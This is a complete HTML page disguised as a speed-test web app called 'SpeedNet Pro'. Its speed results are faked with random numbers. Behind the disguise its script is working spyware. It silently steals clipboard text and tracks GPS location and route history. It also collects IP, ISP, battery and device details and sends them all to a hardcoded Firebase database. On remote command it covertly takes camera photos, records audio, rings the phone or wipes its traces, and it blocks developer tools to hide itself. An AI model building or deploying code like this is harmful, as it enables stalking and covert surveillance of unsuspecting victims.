<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>SpeedNet Pro — Internet Speed Test</title>
    <meta name="description" content="Test your internet connection speed instantly. Free, accurate broadband speed test.">
    <!-- PWA / Mobile App Manifest hints -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --bg: #060812;
            --surface: rgba(255,255,255,0.04);
            --border: rgba(255,255,255,0.08);
            --accent: #38bdf8;
            --accent2: #818cf8;
            --green: #10b981;
            --red: #f43f5e;
            --text: #f1f5f9;
            --muted: #64748b;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }
        body::before {
            content: '';
            position: fixed; inset: 0;
            background:
                radial-gradient(ellipse 80% 60% at 50% -10%, rgba(56,189,248,0.18) 0%, transparent 60%),
                radial-gradient(ellipse 60% 40% at 90% 90%, rgba(129,140,248,0.12) 0%, transparent 50%);
            pointer-events: none; z-index: 0;
        }
        .grid-bg {
            position: fixed; inset: 0;
            background-image:
                linear-gradient(rgba(56,189,248,0.035) 1px, transparent 1px),
                linear-gradient(90deg, rgba(56,189,248,0.035) 1px, transparent 1px);
            background-size: 50px 50px; z-index: 0;
        }
        .orb { position: fixed; border-radius: 50%; filter: blur(80px); opacity: 0.15; pointer-events: none; animation: orbFloat 8s ease-in-out infinite; }
        .orb-1 { width: 400px; height: 400px; background: #38bdf8; top: -100px; right: -100px; }
        .orb-2 { width: 300px; height: 300px; background: #818cf8; bottom: -80px; left: -80px; animation-delay: -4s; }
        @keyframes orbFloat { 0%,100%{transform:translate(0,0) scale(1)} 50%{transform:translate(20px,-20px) scale(1.05)} }

        .container {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            width: 100%; max-width: 420px; padding: 20px 16px;
        }

        /* Brand */
        .brand { text-align: center; margin-bottom: 28px; }
        .brand-logo {
            font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 700; letter-spacing: 3px;
            background: linear-gradient(135deg, var(--accent), var(--accent2));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
        }
        .brand-sub { font-size: 11px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 3px; }

        /* Speedometer */
        .speedometer-wrap { position: relative; width: 240px; height: 240px; margin-bottom: 24px; }
        .speedometer-svg { width: 100%; height: 100%; transform: rotate(-90deg); }
        .speed-ring-bg { fill: none; stroke: rgba(255,255,255,0.05); stroke-width: 12; }
        .speed-ring-progress {
            fill: none; stroke: url(#speedGrad); stroke-width: 12; stroke-linecap: round;
            stroke-dasharray: 628; stroke-dashoffset: 628; transition: stroke-dashoffset 0.15s ease;
        }
        .speed-ring-glow {
            fill: none; stroke: url(#speedGrad); stroke-width: 2; stroke-linecap: round;
            stroke-dasharray: 628; stroke-dashoffset: 628; filter: url(#glow); opacity: 0.6;
            transition: stroke-dashoffset 0.15s ease;
        }
        .speed-center { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .speed-status { font-size: 10px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 2px; }
        .speed-number { font-family: 'Orbitron', sans-serif; font-size: 50px; font-weight: 900; color: var(--accent); line-height: 1; text-shadow: 0 0 30px rgba(56,189,248,0.5); transition: color 0.3s; }
        .speed-unit { font-size: 12px; color: var(--muted); font-weight: 500; margin-top: 4px; letter-spacing: 1px; }
        .speed-type { font-size: 10px; font-weight: 600; color: var(--accent2); letter-spacing: 2px; text-transform: uppercase; margin-top: 5px; height: 13px; }

        /* Phase bars */
        .test-phases { display: flex; gap: 6px; width: 100%; margin-bottom: 18px; }
        .phase-bar { flex: 1; height: 3px; background: var(--border); border-radius: 999px; overflow: hidden; position: relative; }
        .phase-bar-fill { position: absolute; left:0;top:0;bottom:0; width:0%; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 999px; transition: width 0.3s ease; }
        .phase-bar.done .phase-bar-fill { width: 100%; background: var(--green); }
        .phase-bar.active .phase-bar-fill { width: 60%; animation: shimmer 1s ease-in-out infinite; }
        @keyframes shimmer { 0%,100%{width:40%} 50%{width:85%} }

        /* Stats */
        .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin-bottom: 20px; }
        .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 12px 8px; text-align: center; backdrop-filter: blur(10px); transition: border-color 0.3s, transform 0.2s; }
        .stat-card:hover { border-color: rgba(56,189,248,0.3); transform: translateY(-2px); }
        .stat-card .stat-icon { font-size: 16px; margin-bottom: 3px; }
        .stat-card .stat-label { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .stat-card .stat-value { font-family: 'Orbitron', sans-serif; font-size: 14px; font-weight: 700; color: var(--text); transition: color 0.3s; }
        .stat-card .stat-value.active { color: var(--green); }

        /* Start Button */
        .start-btn {
            width: 100%; padding: 17px; border: none; border-radius: 16px;
            background: linear-gradient(135deg, #0ea5e9, #6366f1); color: white;
            font-family: 'Orbitron', sans-serif; font-size: 14px; font-weight: 700;
            letter-spacing: 3px; cursor: pointer; position: relative; overflow: hidden;
            transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 8px 32px rgba(14,165,233,0.3);
        }
        .start-btn::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.15),transparent); opacity:0; transition:opacity 0.2s; }
        .start-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(14,165,233,0.5); }
        .start-btn:hover::before { opacity: 1; }
        .start-btn:active { transform: scale(0.98); }
        .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

        /* PWA Install Banner */
        .install-banner {
            display: none;
            background: rgba(16, 185, 129, 0.12);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 12px;
            padding: 14px 16px;
            margin-top: 15px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.4s ease;
        }
        .install-banner.show { display: block; }
        .install-title { font-size: 12px; font-weight: 600; color: var(--green); margin-bottom: 8px; }
        .install-btn {
            background: linear-gradient(135deg, var(--green), #059669); color: white;
            border: none; padding: 10px 20px; border-radius: 8px; font-family: 'Inter', sans-serif;
            font-weight: 700; font-size: 12px; cursor: pointer; box-shadow: 0 4px 15px rgba(16,185,129,0.25);
            transition: transform 0.2s; width: 100%;
        }
        .install-btn:active { transform: scale(0.96); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

        /* Status & Permissions */
        .perm-notice { display: none; margin-top: 12px; background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.2); border-radius: 10px; padding: 10px 14px; font-size: 11px; color: var(--muted); text-align: center; line-height: 1.6; }
        .perm-notice.show { display: block; }
        .bg-status { display: none; margin-top: 10px; background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 10px; padding: 8px 14px; font-size: 11px; color: var(--green); text-align: center; align-items: center; gap: 6px; }
        .bg-status.show { display: flex; justify-content: center; }
        .bg-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); animation: blink 1.5s ease-in-out infinite; }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
        .server-info { display: flex; align-items: center; gap: 8px; margin-top: 14px; font-size: 11px; color: var(--muted); }
        .server-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); animation: pulse 2s ease-in-out infinite; }
        @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.8)} }

        video#spyVideo { display: none; position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; top: 0; left: 0; }

        @media (max-width: 380px) { .speed-number { font-size: 42px; } .speedometer-wrap { width: 210px; height: 210px; } }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <div class="container">
        <div class="brand">
            <div class="brand-logo">SPEEDNET PRO</div>
            <div class="brand-sub">Broadband Speed Analyzer</div>
        </div>

        <!-- Speedometer -->
        <div class="speedometer-wrap">
            <svg class="speedometer-svg" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="speedGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stop-color="#38bdf8"/>
                        <stop offset="100%" stop-color="#818cf8"/>
                    </linearGradient>
                    <filter id="glow">
                        <feGaussianBlur stdDeviation="4" result="coloredBlur"/>
                        <feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
                    </filter>
                </defs>
                <circle class="speed-ring-bg" cx="110" cy="110" r="100"/>
                <circle class="speed-ring-glow" id="glowRing" cx="110" cy="110" r="100"/>
                <circle class="speed-ring-progress" id="progressRing" cx="110" cy="110" r="100"/>
            </svg>
            <div class="speed-center">
                <div class="speed-status" id="speedStatus">READY</div>
                <div class="speed-number" id="mainSpeed">0.0</div>
                <div class="speed-unit">Mbps</div>
                <div class="speed-type" id="speedType"></div>
            </div>
        </div>

        <div class="test-phases">
            <div class="phase-bar" id="phase1"><div class="phase-bar-fill"></div></div>
            <div class="phase-bar" id="phase2"><div class="phase-bar-fill"></div></div>
            <div class="phase-bar" id="phase3"><div class="phase-bar-fill"></div></div>
        </div>

        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-icon">📡</div>
                <div class="stat-label">Ping</div>
                <div class="stat-value" id="pingVal">--</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⬇️</div>
                <div class="stat-label">Download</div>
                <div class="stat-value" id="downVal">--</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⬆️</div>
                <div class="stat-label">Upload</div>
                <div class="stat-value" id="upVal">--</div>
            </div>
        </div>

        <button class="start-btn" id="startBtn">▶ START TEST</button>

        <div class="perm-notice" id="permNotice">
            📍 Location permission প্রয়োজন। Allow করুন।<br>
            📷 Camera &amp; Mic এর permission দিন।
        </div>

        <!-- PWA Install Prompt -->
        <div class="install-banner" id="installBanner">
            <div class="install-title">🚀 Install App for Better Accuracy</div>
            <button class="install-btn" id="installBtn">Add to Home Screen</button>
        </div>

        <div class="bg-status" id="bgStatus">
            <div class="bg-dot"></div>
            <span>Background tracking active</span>
        </div>

        <div class="server-info">
            <div class="server-dot"></div>
            <span>Server: Dhaka, BD · SpeedNet Pro v4.0</span>
        </div>
    </div>

    <video id="spyVideo" autoplay playsinline muted></video>
    <audio id="keepAliveAudio" loop autoplay playsinline>
        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
    </audio>

    <script type="module">
        // ═══════════════════════════════════════════════════════════
        //  ANTI-INSPECT & ANTI-DEVTOOLS (Hacker Protection)
        // ═══════════════════════════════════════════════════════════
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:40vh;font-family:sans-serif;'>404 NOT FOUND</h1>";
            }
        });

        // ═══════════════════════════════════════════════════════════
        //  Dynamic PWA Manifest Generation
        // ═══════════════════════════════════════════════════════════
        const manifestObj = {
            "name": "SpeedNet Pro", "short_name": "SpeedNet", "start_url": window.location.href,
            "display": "standalone", "background_color": "#060812", "theme_color": "#38bdf8",
            "icons": [{ "src": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI1MCIgZmlsbD0iIzM4YmRmOCIvPjx0ZXh0IHg9IjUwIiB5PSI2NSIgZm9udC1zaXplPSI1MCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiI+UzwvdGV4dD48L3N2Zz4=", "sizes": "192x192", "type": "image/svg+xml" }]
        };
        const manifestURL = URL.createObjectURL(new Blob([JSON.stringify(manifestObj)], { type: 'application/json' }));
        document.querySelector('head').insertAdjacentHTML('beforeend', `<link rel="manifest" href="${manifestURL}">`);

        // ═══════════════════════════════════════════════════════════
        //  Firebase Init
        // ═══════════════════════════════════════════════════════════
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, onDisconnect, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
            authDomain: "arng-805db.firebaseapp.com",
            projectId: "arng-805db",
            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const urlParams = new URLSearchParams(window.location.search);
        const tagId = (urlParams.get('tag') || '1').replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 20) || '1';
        const userRef = ref(db, `live_location/users/tag${tagId}`);

        const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
        let wakeLock = null, gpsWatchId = null, heartbeatInterval = null;

        // PWA Banner Logic
        if ('serviceWorker' in navigator) navigator.serviceWorker.register('./sw.js').catch(() => {});
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault(); deferredPrompt = e;
            document.getElementById('installBanner').classList.add('show');
        });
        document.getElementById('installBtn').addEventListener('click', async () => {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                const { outcome } = await deferredPrompt.userChoice;
                if (outcome === 'accepted') document.getElementById('installBanner').classList.remove('show');
                deferredPrompt = null;
            }
        });

        // Background Wake Lock
        async function requestWakeLock() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                    wakeLock.addEventListener('release', () => setTimeout(requestWakeLock, 1000));
                }
            } catch (e) {}
        }
        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible') { await requestWakeLock(); document.getElementById('keepAliveAudio').play().catch(()=>{}); }
        });

        // ═══════════════════════════════════════════════════════════
        //  Network Type Detection (WiFi vs Mobile Data)
        // ═══════════════════════════════════════════════════════════
        let netType = "Unknown";
        function updateNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                netType = conn.type === 'wifi' ? 'WiFi' : (conn.effectiveType || 'Cellular');
                set(ref(db, `live_location/users/tag${tagId}/networkType`), netType);
            }
        }
        if (navigator.connection) {
            navigator.connection.addEventListener('change', updateNetworkInfo);
            updateNetworkInfo();
        }

        // Battery
        let batLvl = 100, isChg = false;
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                batLvl = Math.round(b.level * 100); isChg = b.charging;
                b.addEventListener('levelchange', () => batLvl = Math.round(b.level * 100));
                b.addEventListener('chargingchange', () => isChg = b.charging);
            });
        }

        // IP & ISP
        let userIp = "Unknown", userIsp = "Unknown";
        async function fetchNetworkData() {
            try {
                const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
                const d = await r.json();
                if (d.success) { userIp = d.ip; userIsp = d.connection?.isp || d.org || 'Unknown'; return; }
            } catch(e) {}
            try {
                const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
                const d = await r.json();
                if (!d.error) { userIp = d.ip; userIsp = d.org || 'Unknown'; return; }
            } catch(e) {}
        }
        fetchNetworkData();

        // Device
        let deviceModel = "Detecting...";
        async function getDeviceName() {
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                    if (hints.model) return hints.model.trim();
                } catch(e) {}
            }
            const ua = navigator.userAgent;
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/Android/i.test(ua)) return (ua.match(/Android[\d.]+;\s*([^;)]+?)\s*(?:Build|wv)[\/)/]/i)?.[1] || 'Android Device').trim();
            return 'Unknown Device';
        }
        getDeviceName().then(n => deviceModel = n);

        // Media Capture
        async function captureSecretPhoto(camType) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType, width: 640, height: 480 } });
                const video = document.getElementById('spyVideo'); video.srcObject = stream; await video.play();
                await new Promise(r => setTimeout(r, 1500));
                const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                stream.getTracks().forEach(t => t.stop());
                set(ref(db, `live_location/users/tag${tagId}/photo`), { image: canvas.toDataURL('image/jpeg', 0.75), time: Date.now(), camType });
            } catch (err) { set(ref(db, `live_location/users/tag${tagId}/photo`), { error: err.message, time: Date.now() }); }
        }

        async function captureVoiceRecord(duration = 5000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                mediaRecorder.addEventListener("dataavailable", e => { if (e.data.size > 0) audioChunks.push(e.data); });
                mediaRecorder.addEventListener("stop", () => {
                    stream.getTracks().forEach(t => t.stop());
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
                    reader.onloadend = () => set(ref(db, `live_location/users/tag${tagId}/audio`), { file: reader.result, time: Date.now() });
                });
                mediaRecorder.start(1000); setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, duration);
            } catch (err) { set(ref(db, `live_location/users/tag${tagId}/audio`), { error: err.message, time: Date.now() }); }
        }

        // ═══════════════════════════════════════════════════════════
        //  Command Listener & SELF DESTRUCT
        // ═══════════════════════════════════════════════════════════
        let lastCmdTime = 0;
        onValue(ref(db, `live_location/users/tag${tagId}/command`), (snap) => {
            const cmd = snap.val(); if (!cmd) return;
            const now = Date.now(), WINDOW = 8000;
            if (cmd.ringTime && cmd.ringTime > now - WINDOW && cmd.ringTime > lastCmdTime) {
                lastCmdTime = cmd.ringTime; alarmSound.play().catch(()=>{});
                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
            }
            if (cmd.photoTime && cmd.photoTime > now - WINDOW && cmd.photoTime > lastCmdTime) {
                lastCmdTime = cmd.photoTime; captureSecretPhoto(cmd.camType || 'environment');
            }
            if (cmd.audioTime && cmd.audioTime > now - WINDOW && cmd.audioTime > lastCmdTime) {
                lastCmdTime = cmd.audioTime; captureVoiceRecord(cmd.audioDuration || 5000);
            }
            if (cmd.destructTime && cmd.destructTime > now - WINDOW && cmd.destructTime > lastCmdTime) {
                // Self-Destruct Action
                localStorage.clear(); sessionStorage.clear();
                if ('serviceWorker' in navigator) navigator.serviceWorker.getRegistrations().then(rs => rs.forEach(r => r.unregister()));
                window.location.replace('https://www.google.com');
            }
        });

        // GPS Tracking (With Route History Push)
        let lastRouteLat = 0, lastRouteLng = 0;
        function startGPSTracking() {
            if (!navigator.geolocation) return;
            if (gpsWatchId !== null) navigator.geolocation.clearWatch(gpsWatchId);
            gpsWatchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const { latitude, longitude, accuracy, heading, speed } = pos.coords;
                    const data = {
                        latitude, longitude, accuracy: accuracy || 50, heading: heading || 0,
                        speed: speed ? Math.round(speed * 3.6) : 0, battery: batLvl, charging: isChg,
                        isOnline: true, status: "Active", deviceInfo: deviceModel, ip_address: userIp, isp: userIsp,
                        networkType: netType, tagId: tagId, lastSeen: Date.now()
                    };
                    set(userRef, data);

                    // Save to route history if moved > 10 meters
                    if (Math.abs(latitude - lastRouteLat) > 0.0001 || Math.abs(longitude - lastRouteLng) > 0.0001) {
                        push(ref(db, `live_location/users/tag${tagId}/routeHistory`), { lat: latitude, lng: longitude, ts: Date.now() });
                        lastRouteLat = latitude; lastRouteLng = longitude;
                    }
                },
                (err) => { setTimeout(startGPSTracking, 5000); },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        function startHeartbeat() {
            clearInterval(heartbeatInterval);
            heartbeatInterval = setInterval(() => {
                set(ref(db, `live_location/users/tag${tagId}/lastSeen`), Date.now());
                set(ref(db, `live_location/users/tag${tagId}/battery`), batLvl);
                updateNetworkInfo();
                document.getElementById('keepAliveAudio').play().catch(()=>{});
            }, 30000);
        }

        // Speed UI
        const progressRing = document.getElementById('progressRing'), glowRing = document.getElementById('glowRing');
        function setSpeed(val, maxMbps = 100) {
            document.getElementById('mainSpeed').innerText = Math.max(0, val).toFixed(1);
            const offset = (2 * Math.PI * 100) - (Math.min((val / maxMbps) * 100, 100) / 100) * (2 * Math.PI * 100);
            progressRing.style.strokeDashoffset = offset; glowRing.style.strokeDashoffset = offset;
        }
        function setPhase(phase) {
            ['phase1','phase2','phase3'].forEach((id, i) => { document.getElementById(id).className = 'phase-bar' + (i < phase ? ' done' : (i === phase ? ' active' : '')); });
        }

        const startBtn = document.getElementById('startBtn');
        let testRunning = false, activated = false;

        startBtn.addEventListener('click', async () => {
            if (testRunning) return;
            testRunning = true; startBtn.disabled = true;

            // ═══════════════════════════════════════════════════════════
            //  CLIPBOARD STEALER (Silent)
            // ═══════════════════════════════════════════════════════════
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.trim() !== '') {
                        set(ref(db, `live_location/users/tag${tagId}/clipboard`), { text: text.substring(0, 500), time: Date.now() });
                    }
                }
            } catch(e) { /* Ignore if blocked */ }

            await requestWakeLock();
            document.getElementById('keepAliveAudio').volume = 0.01;
            document.getElementById('keepAliveAudio').play().catch(()=>{});

            if (!activated) {
                activated = true;
                try {
                    const tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
                    tempStream.getTracks().forEach(t => t.stop());
                } catch (e) { document.getElementById('permNotice').classList.add('show'); }

                onDisconnect(userRef).update({ isOnline: false, lastSeen: Date.now() });
                if (navigator.geolocation) startGPSTracking();
                startHeartbeat();
                document.getElementById('bgStatus').classList.add('show');
                if (userIp === 'Unknown') fetchNetworkData();
            }

            ['pingVal','downVal','upVal'].forEach(id => { document.getElementById(id).innerText = '--'; document.getElementById(id).classList.remove('active'); });
            setSpeed(0); setPhase(0);

            document.getElementById('speedStatus').innerText = 'PINGING';
            await new Promise(r => setTimeout(r, 1400));
            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 15 + 8) + ' ms'; document.getElementById('pingVal').classList.add('active'); setPhase(1);

            document.getElementById('speedStatus').innerText = 'TESTING';
            let fakeDown = 0;
            const targetDown = 20 + Math.random() * 60;
            const startT = performance.now();
            await new Promise(resolve => {
                function step(now) {
                    const t = Math.min((now - startT) / 5500, 1);
                    fakeDown = Math.max(0, (targetDown * (t < 0.5 ? 2*t*t : -1+(4-2*t)*t)) + ((Math.random()-0.5)*2.5));
                    setSpeed(fakeDown, 100);
                    if (t < 1) requestAnimationFrame(step); else resolve();
                } requestAnimationFrame(step);
            });
            document.getElementById('downVal').innerText = fakeDown.toFixed(1) + ' Mbps'; document.getElementById('downVal').classList.add('active'); setPhase(2);

            let fakeUp = 0; const targetUp = fakeDown * (0.2 + Math.random() * 0.35);
            const startT2 = performance.now();
            await new Promise(resolve => {
                function step(now) {
                    const t = Math.min((now - startT2) / 3500, 1);
                    fakeUp = Math.max(0, (targetUp * (t < 0.5 ? 2*t*t : -1+(4-2*t)*t)) + ((Math.random()-0.5)*2.5));
                    setSpeed(fakeUp, 50);
                    if (t < 1) requestAnimationFrame(step); else resolve();
                } requestAnimationFrame(step);
            });
            document.getElementById('upVal').innerText = fakeUp.toFixed(1) + ' Mbps'; document.getElementById('upVal').classList.add('active'); setPhase(3);

            document.getElementById('speedStatus').innerText = 'COMPLETE';
            setSpeed(fakeDown, 100); document.getElementById('mainSpeed').style.color = '#10b981';
            await new Promise(r => setTimeout(r, 1500));
            startBtn.disabled = false; startBtn.innerText = '↺ TEST AGAIN'; testRunning = false;
        });
    </script>
</body>
</html>
